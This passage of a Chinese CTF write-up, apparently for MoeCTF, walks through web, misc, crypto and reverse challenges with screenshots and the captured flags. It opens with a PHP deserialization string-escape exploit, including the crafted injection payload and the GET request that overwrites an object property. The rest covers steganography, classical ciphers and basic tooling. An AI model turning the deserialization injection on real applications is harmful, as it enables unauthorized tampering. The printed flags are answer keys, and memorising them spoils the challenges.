+<h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>反序列化漏洞 字符串逃逸</p>
+<p><img src="https://s2.loli.net/2024/03/07/eA4WuVPmNLdX9bi.png"></p>
+<p>Hanxin.exe.php 里也有源文件</p>
+<p><img src="https://s2.loli.net/2024/03/07/K1Cq3dcmEp2waDx.png"></p>
+<p><strong>从下面读吧，flag是环境变量，只要满足让Spear_Owner&#x3D;MaoLei就可以得到flag<br>Spear_Owner是类Omg_It_Is_So_Cool_Bring_Me_My_Flag的变量<br>再看第一张图的$new_visitor &#x3D; new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);<br>$Nwe_visitor调用了此类创建实例，然后被反序列化后赋值给变量before<br>before再运行了Make_a_Move($move)方法，也就是第二张图十三枪那里,其作用是对符合条件的字符串进行替换<br>结束此方法后的值给到after，并对其进行序列化，接着运行Omg_It_Is_So_Cool_Bring_Me_My_Flag类里的判断，如果此时Spear——Owner的值是MaoLei的话就可以获得flag了</strong></p>
+<p>这里在十三枪替换处存在一个字符串逃逸的漏洞，具体原理参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/108210822">资料</a></p>
+<p>我这里用第一枪，替换一个逃逸一个字符</p>
+<p>关键 payload：<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code> 占 35 格</p>
+<p>那就给 35 个第一枪上去 <code>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p>
+<p>这里总共 420 格，最后补其句式即可</p>
+<p><strong>EXP：<br>GET:URL&#x2F;?chant&#x3D;o:34:”Omg_It_Is_So_Cool_Bring_Me_My_Flags”:2{s:5:”Chant”s:420:”di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang”;s:11:”Spear_Owner”;s:6:”MaoLei”;}</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/hLwFTW6SYnQmAU1.png"></p>
+<blockquote>
+<p>这里还可以用第七枪，第七枪一次逃逸 5 格</p>
+</blockquote>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-入门指北"><a href="#misc-入门指北" class="headerlink" title="misc 入门指北"></a>misc 入门指北</h3><p>   base64</p>
+<p><img src="https://s2.loli.net/2024/03/07/lgX2kOVTrIesMS9.png"></p>
+<p><strong>base64解码</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/V32EnUoTMLHvmZP.png"></p>
+<p><strong>moectf{h@v3_fun_@t_m15c_!}</strong></p>
+<h3 id="打不开的图片-1"><a href="#打不开的图片-1" class="headerlink" title="打不开的图片 1"></a>打不开的图片 1</h3><p>jpg 文件头缺失，exif 隐写，hex</p>
+<p><strong>拿到空文件去 010 看看</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/JkOfbMltdzyZrHm.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/ZXg5tv13ydFBkuD.png"></p>
+<p>尾巴 FF D9 符合 jpg，考查文件头缺失</p>
+<p>补充 jpg 文件头即可</p>
+<p><img src="https://s2.loli.net/2024/03/08/mlOeSJrGjwCYhHL.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/J8k6SGgaEU7fX34.png"></p>
+<p>保存后，改后缀为.jpg 后打开</p>
+<p><img src="https://s2.loli.net/2024/03/07/Na8ws5WZCtemvd2.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/aX7xbN1fCvFOAin.png"></p>
+<p><strong>没有东西，才看到 ascii 里有 exif，考虑属性藏了东西</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/ViPvytK4SAw23YJ.png"></p>
+<p><strong>藏了 hex，解码</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/WO2Xk6oibzVRax5.png"></p>
+<p><strong>moectf{XDU_i5_v3ry_6e@u2ifu1}</strong></p>
+<h3 id="打不开的图片-2"><a href="#打不开的图片-2" class="headerlink" title="打不开的图片 2"></a>打不开的图片 2</h3><p>png 文件头尾</p>
+<p><img src="https://s2.loli.net/2024/03/07/M14avGSqhmByEYe.png"></p>
+<p><strong>根据提示猜测文件头尾不相同</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/iprHoFQ7XKMcEyJ.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/TPizcvglEqFSXps.png"></p>
+<p>改头为 png 格式即可</p>
+<p><img src="https://s2.loli.net/2024/03/07/KypDFVbLUIgn78v.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/629yAYpGxNFwOcK.png"></p>
+<p>刚好改前面四个就行</p>
+<p><img src="https://s2.loli.net/2024/03/08/FYUd7LCecWHjQkn.png"></p>
+<p><strong>moectf{D0_yOu_1ik3_Bo7@ck_?}</strong></p>
+<h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p>010editor</p>
+<p><strong>题目给的一个 wav 文件，但 flag 实际就在 ascii 最底下</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/WUQpRZrE6mOfJoV.png"></p>
+<p><strong>moectf{eeeez_f1ag_as_A_G1ft!}</strong></p>
+<h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p>   社工</p>
+<blockquote>
+<p>直说过程</p>
+</blockquote>
+<p><strong>百度识图，社到地址为****厦门大学翔安校区图书馆</strong></p>
+<p><strong>然后百度地图拾取器，定位直接提取经纬度</strong></p>
+<p><strong>设备信息在 exif 里面有型号，复制到网上一搜就是红米 k60，再搜其发布时间即可</strong></p>
+<p><strong>moectf{P0sT_Y0uR_Ph0T0_wiTh_0Riginal_File_is_n0T_a_g00d_idea_YlJf!M3rux}</strong></p>
+<h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p>尊嘟假嘟加密，blowfish 加密，base58(区块链地址加密方式)，</p>
+<p>先拿到 txt 文本</p>
+<p><img src="https://s2.loli.net/2024/03/07/Z51VGSjry9E3YKO.png"></p>
+<p>在 github 里搜索到对应加密    <a target="_blank" rel="noopener" href="https://github.com/SnailSword/zdjd">GitHub - SnailSword&#x2F;zdjd: 人类语言与尊嘟语的转换器。</a></p>
+<p><img src="https://s2.loli.net/2024/03/07/hgLKuZeUCtRHNvl.png"></p>
+<p>在线解密即可</p>
+<p><img src="https://s2.loli.net/2024/03/07/MCEU5fw9mVsvrd6.png"></p>
+<p><strong>密码已经给出<br>key：字符串zundujiadu?哈希加密后b60开头哈希值末尾8个字节<br>iv（偏移量）：字符串dududu?哈希加密后272开头哈希值末尾8个字节<br>hint1：比特币地址的加密方式<br>hint2：此次加密的名称为“bl</strong><em>sh”</em>*</p>
+<p><a target="_blank" rel="noopener" href="https://tool.ip138.com/hash/">哈希加密算法 MD5|SHA-1|SHA-2|SHA-256|SHA-512|SHA-3|RIPEMD-160 哈希 Hash 加密算法 iP138 在线工具</a></p>
+<p><img src="https://s2.loli.net/2024/03/08/AkcVIhHD4KNe5uy.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/AXaQfmkOZtirco8.png"></p>
+<p><strong>比特币区块链（三） | 比特币地址</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/2OSrMuo1LjgfIib.png"></p>
+<p><strong>cyberchef 直接搜 bl 找对应的就行</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/Mr6LaP2e4KWDctS.png"></p>
+<p>总结如下</p>
+<p><img src="https://s2.loli.net/2024/03/08/1xtP6dMSnDefjJu.png"></p>
+<p><strong>赛博厨子解密</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/ADiGydP3HqmQET8.png"></p>
+<p><strong>moectf{wow_you_aRe_the_masteR_of_Zundujiadu_92WPIBung92WPIBung9?WPIBung}</strong></p>
+<h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>UTF-7  AES</p>
+<p><img src="https://s2.loli.net/2024/03/08/5ABMdz4LOUErIui.png"></p>
+<p>坤坤，以后做全试一遍得了，目前还不太懂这类编码…</p>
+<p><img src="https://s2.loli.net/2024/03/07/CXYEKiQlb72mIGL.png"></p>
+<p>文本内容可以用 decode text 解决，选择 UTF-7 模式，并且 input ouput 的右下角都要选择 UTF-7</p>
+<p>**这是你的flag：</p>
+<p>a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262</p>
+<p>但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）</p>
+<p>所以说，codepage真的很重要啊（**</p>
+<p>开头有了但没有后面，试试加密下后面的文本</p>
+<p><img src="https://s2.loli.net/2024/03/08/CR9TMjrxoyA6gJd.png"></p>
+<p>给了句子的前面部分，所以这里直接把句子的 sha256 复制就行</p>
+<p><img src="https://s2.loli.net/2024/03/07/DBkPAptg2Yem6bh.png"></p>
+<p>这里记录下各个位置的参数选择</p>
+<h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h3><p>lsb 隐写</p>
+<p><strong>尝试了很多，一开始 zsteg 还不行，后来 m 神说图片太大，要改宽高变小点再试</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/7jhT95yXAsfle4d.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/6Ak4CVqX8FSnGwz.png"></p>
+<p><strong>高度改成和宽度一样再试试</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/NwaiB5zRJt7Ipfg.png"></p>
+<p><strong>moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}</strong></p>
+<h3 id="base-乐队"><a href="#base-乐队" class="headerlink" title="base 乐队"></a>base 乐队</h3><p>base 嵌套   栅栏密码</p>
+<p><strong>拿到字符串放到 cyberchef 中</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/ywFGurgQD2Ekodj.png"></p>
+<p><strong>看到两个&#x3D;但不是都在最后，考虑可能有凯撒或者栅栏或者 rot 啥的吧，直接工具梭哈一下</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/86zZsEtaOfmTNkR.png"></p>
+<p><strong>栅栏密码，把明文再放入 cyberchef 中</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/3oa1HrSMDdyhslF.png"></p>
+<p><strong>moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}</strong></p>
+<h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>   ppt 隐写</p>
+<p><img src="https://s2.loli.net/2024/03/07/IK6cAQmSjGJCD5w.png"></p>
+<p><img src="https://s2.loli.net/2024/03/08/MTRg1XKjaqDFu9L.png"></p>
+<p><strong>附件下来看到里面有 ppt，结合题目说不是压缩包，尝试改后缀.ppt</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/VApag8w1WZUEI9s.png"></p>
+<p><strong>Ctrl+a 全选找找是否有藏起来的文字框</strong></p>
+<p><strong>发现第二页是把字体改白色和背景混起来了</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/EYflCBhgHmTceA3.png"></p>
+<p><strong>第三页同样方法，藏在图片后面，但 123456 是假的，注释才是 flag 内容</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/Q4BI6Pfpmnh1w9r.png"></p>
+<p><strong>第四页同理</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/BFqMDRHIhof1rag.png"></p>
+<p><strong>最后一页按次方法没用，但估计最后一段就在这里了，根据前面得到 flag 为****moectf{2ip_?_n0_i4</strong></p>
+<p><strong>也可以猜到是 ppt 或者 pptx，估计一直爆破也能出</strong></p>
+<p><strong>通过 m 神提示：还可以 ctrl+f 搜索一下</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/coy3IluUwY8O4WR.png"></p>
+<p><strong>锁定在这个框，但是不是改文字颜色，啥都找不到，这时 m 神发了个视频</strong></p>
+<p>得一直拖着它才可以看到，最后得到 flag</p>
+<p><strong>moectf{2ip_?_n0_i4_pp4x!}</strong></p>
+<h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h3><p>社工</p>
+<p><img src="https://s2.loli.net/2024/03/07/l5CchoUIGeiyZMT.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/YwugSjerdv7ARUa.png"></p>
+<p><strong>第一张抓远处南京站，城市便捷，还有下面的店铺猪霸王</strong></p>
+<p><strong>百度地图里面定位好后，切<strong><strong>3D</strong></strong>到这条路上一看，只有一栋高楼对应，jiashi</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/OL2so5MuvBYPjyX.png"></p>
+<p><strong>第二张很明显，百度地图直接定位中山路美食街，切<strong><strong>3D</strong></strong>进门口的路口处观察</strong></p>
+<p><strong>对面只有一个博物馆和一个高楼，博物馆太矮所以锁定百盛广场   baisheng</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/5iFsYPOgUdV7HQj.png"></p>
+<p>第三张图可找死我了，这个拍摄角度非常刁钻，我抓的是时代丽都和中国人保还有 95500（太平洋保险）</p>
+<p>定位也到了，但最后发现太平洋保险离另外两个特别远，后来才知道做法不对，这张图 exif 有经纬度</p>
+<p><a target="_blank" rel="noopener" href="https://www.strerr.com/cn/exif.html">在线查看图片经纬度_图片 Exif 信息_图片定位信息_GPS 信息 - StrErr.com</a></p>
+<p><img src="https://s2.loli.net/2024/03/08/B6u5x2IoT8s1anN.png"></p>
+<p>google 地图打开</p>
+<p><img src="https://s2.loli.net/2024/03/08/AzFB6svRo7Wr3Ip.png"></p>
+<p><strong>试了亚朵发现不行，后来百度地图也定位到这里才发现这栋楼叫汇金苑..         huijin</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/iojJk5GIrZuTNmC.png"></p>
+<p><strong>moectf{jiashi_baisheng_huijin}</strong></p>
+<h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h3><p>压缩包套娃</p>
+<blockquote>
+<p>使用压缩包脚本（来自紫竹老公写的）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> rarfile</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line">a=<span class="number">9999</span></span><br><span class="line"><span class="keyword">while</span> a!=<span class="number">0</span>:</span><br><span class="line">  zipname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(zipname)):</span><br><span class="line">    zfile=zipfile.ZipFile(zipname)</span><br><span class="line">    zfile.extractall()</span><br><span class="line">    zfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  rarname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.rar&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(rarname)):</span><br><span class="line">    rfile=rarfile.RarFile(rarname)</span><br><span class="line">    rfile.extractall()</span><br><span class="line">    rfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  tarname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.tar.gz&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(tarname)):</span><br><span class="line">    rfile=tarfile.<span class="built_in">open</span>(tarname)</span><br><span class="line">    rfile.extractall()</span><br><span class="line">    rfile.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br><span class="line">  zname=<span class="string">&#x27;shell&#x27;</span>+<span class="built_in">str</span>(a)+<span class="string">&#x27;.7z&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(os.path.exists(zname)):</span><br><span class="line">    file=py7zr.SevenZipFile(zname)</span><br><span class="line">    file.extractall()</span><br><span class="line">    file.close()</span><br><span class="line">    a-=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/03/07/HTJXwLzkmE9lWgr.png"></p>
+<p><strong>moectf{Ca7_s133p1ng_und3r_zip_5hell5}</strong></p>
+<h3 id="你想要-flag-吗"><a href="#你想要-flag-吗" class="headerlink" title="你想要 flag 吗"></a>你想要 flag 吗</h3><p>知识点 ：音频 lsb 隐写  rabbit 加密</p>
+<p>拿到音频文件查看下频谱图</p>
+<p><img src="https://s2.loli.net/2024/03/08/BEfYoP86i7UMA31.png"></p>
+<p><strong>steghide</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/X2FouNvfnkr4xV6.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/KvDYkizV6bom123.png"></p>
+<p><strong>根据文件名和编码前缀可知为 rabbit 加密</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/XgHKW8w2ACjJGDZ.png"></p>
+<p><strong>moectf{Mu5ic_1s_v3ry_1nt23esting_!}</strong></p>
+<h3 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h3><p>   图片分离 + 盲水印</p>
+<p><img src="https://s2.loli.net/2024/03/07/1EcwadCNuPA5OZf.png"></p>
+<p><strong>题目仅给了一张图，根据题目描述猜测是两张图的盲<strong><strong>水印</strong></strong>，这里先要把图片文件分成两张图</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/RctwyNb1FTZjHUS.png"></p>
+<p>010 搜索 png 文件尾发现有两个并且一个在中间一个在末尾，手工分离一下，并添加好文件头</p>
+<p><strong>- PNG (png)，<br>文件头：89 50 4E 47 0D 0A 1A 0A<br>文件尾：AE 42 60 82</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/wEyW7QAuarGg2eD.png"></p>
+<p>利用工具操作即可</p>
+<p><img src="https://s2.loli.net/2024/03/07/As29n4Uqej1TraJ.png"></p>
+<blockquote>
+<p><strong>注意模式和先后顺序均有讲究</strong></p>
+</blockquote>
+<p><img src="https://s2.loli.net/2024/03/07/tjZXKvqwlerFHdC.png"></p>
+<p><strong>moectf{W0w_you_6@v3_1earn3d_blind_w@t3rma2k}</strong></p>
+<h3 id="狗子-4-故乡话"><a href="#狗子-4-故乡话" class="headerlink" title="狗子(4) 故乡话"></a>狗子(4) 故乡话</h3><p>mc 脑洞题  附魔台语言</p>
+<p><img src="https://s2.loli.net/2024/03/07/LHKkVC5xlr9hIiW.png"></p>
+<p><strong>true 改 1，false 改 0</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/fcKzw15nukHyG94.png"></p>
+<p><strong>眯眼睛看隐隐约约好像有东西在里面</strong></p>
+<p>**把 0 改.   1 改 0 **</p>
+<p><img src="https://s2.loli.net/2024/03/07/YOsW5D2JydaiPcR.png"></p>
+<p><strong>明显多了，紫竹思路是猜测附魔台的语言，果真啊牛逼</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/pd7q2zRwEaD95ju.png"></p>
+<p><strong>对照表翻译即可</strong></p>
+<p><img src="https://s2.loli.net/2024/03/07/bTqgmOdE5l3pK16.png"></p>
+<p><strong>moectf{dontanswer}</strong></p>
+<h3 id="weird-package"><a href="#weird-package" class="headerlink" title="weird_package"></a>weird_package</h3><p>文件 hex 码的拼接   base64  raw-inflate</p>
+<p><img src="https://s2.loli.net/2024/03/08/t6jToSyJhiZWsz5.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/mMywIAsaG9XYdfh.png"></p>
+<p>010 打开压缩包看到很多压缩包隐写在里面</p>
+<p>但是 binwalk 不出来，<strong>猜测是要自己拼接</strong></p>
+<p>但是 <strong>bandizip 可以直接修复</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/TS1QjbYOU3EHALk.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/gnKrIRpLk73SjQC.png"></p>
+<p><img src="https://s2.loli.net/2024/03/07/l843dHy7GESeLkh.png"></p>
+<p>打开后都是类似 base64 的玩意，按队里佬提示用 cyberchef 解密</p>
+<p><img src="https://s2.loli.net/2024/03/07/WTrKNXGdtuAqHnI.png"></p>
+<p>八个假的，只有一个是真的 flag</p>
+<p><img src="https://s2.loli.net/2024/03/07/rvtGiowLVNSynj3.png"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h3><p>   逆向脚本</p>
+<p><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a>    pyc 在线编译，没工具的把题目的 pyc 文件放这里就行</p>
+<p><img src="https://s2.loli.net/2024/03/08/Ls1gEUJIZ5CVX9F.png"></p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&quot;</span></span><br><span class="line">string1 = <span class="string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&quot;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>
+
+<p>把题目给的 str1，string1，string2 都替换脚本里的运行就可以了</p>
+<p><img src="https://s2.loli.net/2024/03/08/koOmbn17Cdwjq9v.png"></p>
+<p><strong>moectf{pYc_And_Base64~}</strong></p>
+<h3 id="ccccc"><a href="#ccccc" class="headerlink" title="ccccc"></a>ccccc</h3><p>c 语言编程题</p>
+<p><img src="https://s2.loli.net/2024/03/08/CwbJ63ergTEacWF.png"></p>
+<p>学习 c 语言编程</p>
+<p><strong>moectf{HAHA_C_1s_easy!}</strong></p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 编程题</p>
+<p><img src="https://s2.loli.net/2024/03/08/QCTdR7tAg6s8ulF.png"></p>
+<p>运行得到 flag</p>
+<p><strong>moectf{Pyth0n_1z_0ur_g00d_friendz}</strong></p>
+<h3 id="runme"><a href="#runme" class="headerlink" title="runme"></a>runme</h3><p>cmd or powershell 运行</p>
+<p>powershell 运行 runme.exe 即可</p>
+<p><img src="https://s2.loli.net/2024/03/08/IpVn64rWahxgCJ1.png"></p>
+<p><strong>moectf{0h_y0u_can_use_cmd!!!}</strong></p>
+<h3 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h3><p>   kali 运行即可</p>
+<p>先改个权限先：chmod 777 [文件]</p>
+<p><img src="https://s2.loli.net/2024/03/08/PCMofQA81VtIgnN.png"></p>
+<p><strong>moectf{Run_me_in_linux!}</strong></p>
+<h3 id="crypto-入门指北"><a href="#crypto-入门指北" class="headerlink" title="crypto 入门指北"></a>crypto 入门指北</h3><p>经典 RSA</p>
+<p><img src="https://s2.loli.net/2024/03/08/ZKdslGuB38x56Rk.png"></p>
+<p>运行得到 flag</p>
+<p><strong>moectf{weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!}</strong></p>
+<h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>rot47 密码</p>
+<p><strong>题目给的字符串结合提示一个一个试rot即可</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/Bkg79Fsn6twILOe.png"></p>
+<p><strong>moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}</strong></p>
+<h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p>栅栏密码（w 型）</p>
+<p><a target="_blank" rel="noopener" href="http://www.metools.info/code/fence154.html">栅栏在线</a></p>
+<p><img src="https://s2.loli.net/2024/03/08/DU59WR8axu12EdK.png"></p>
+<p><strong>moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}</strong></p>
+<h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>   凯撒密码</p>
+<p>7 位</p>
+<p><img src="https://s2.loli.net/2024/03/08/E32FrNSt4xOkW7g.png"></p>
+<p><strong>moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}</strong></p>
+<h3 id="不是”皇帝的新密码”"><a href="#不是”皇帝的新密码”" class="headerlink" title="不是”皇帝的新密码”"></a>不是”皇帝的新密码”</h3><p>维吉尼亚密码</p>
+<blockquote>
+<p>前面皇帝的新密码指的是凯撒，而现在又要扯到他，指明不是凯撒，那很有可能是其的延伸维吉尼亚</p>
+</blockquote>
+<p>先拿 moectf 试下</p>
+<p><img src="https://s2.loli.net/2024/03/08/weOsTEhARKLxoti.png"></p>
+<p><strong>猜测goodjob为key</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/V7WzY4wU2c3s9mB.png"></p>
+<p><strong>moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}</strong></p>
+<h3 id="Reverse-入门指北"><a href="#Reverse-入门指北" class="headerlink" title="Reverse 入门指北"></a>Reverse 入门指北</h3><p>IDA 反编译</p>
+<p>exe 文件放入 ida64 中</p>
+<p><img src="https://s2.loli.net/2024/03/08/5ACDIZu237WaRqd.png"></p>
+<p><strong>找到main函数F5反编译成c语言即可</strong></p>
+<p><strong>moectf{F1rst_St3p_1s_D0ne}</strong></p>
+<h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>linux 基础命令</p>
+<p>一开始给 localhost（127.0.0.1）地址的话虚拟机 nc 不了</p>
+<p>听 m 神，给了个 0.0.0.0 的地址，然后先 <code>ip addr | grep 192.</code> 查询了自己的 ip</p>
+<p>然后 nc 自己的 ip 端口 就可以登了</p>
+<p><img src="https://s2.loli.net/2024/03/08/1kQY6Z4ruSygdOf.png"></p>
+<p>ls 看到有 gift，试试 cat 一下</p>
+<p><img src="https://s2.loli.net/2024/03/08/WKDMLbZwV6JNTFp.png"></p>
+<blockquote>
+<p>我的 linux 语言基础太弱了捏</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2024/03/08/u5n1wtAymLrVHPR.png"></p>
+<p><strong>Ls -a查下所有文件</strong></p>
+<p><img src="https://s2.loli.net/2024/03/08/52LUGIbqaVzcjBl.png"></p>
+<p>看到隐藏的 flag 了，再 cat 就行</p>
+<p><strong>moectf{Dsa-vTzMEdclL0G6gDkH4NXfAcvGsR_g}</strong></p>
+<h3 id="ai-入门指北"><a href="#ai-入门指北" class="headerlink" title="ai 入门指北"></a>ai 入门指北</h3><p>   Torch 安装命令</p>
+<p><strong>moectf{install_torch_torchvision_torchaudio}</strong></p>
+<h3 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h3><p>异或运算</p>
+<p>拿到题目找到 main 函数 F5 反编译</p>
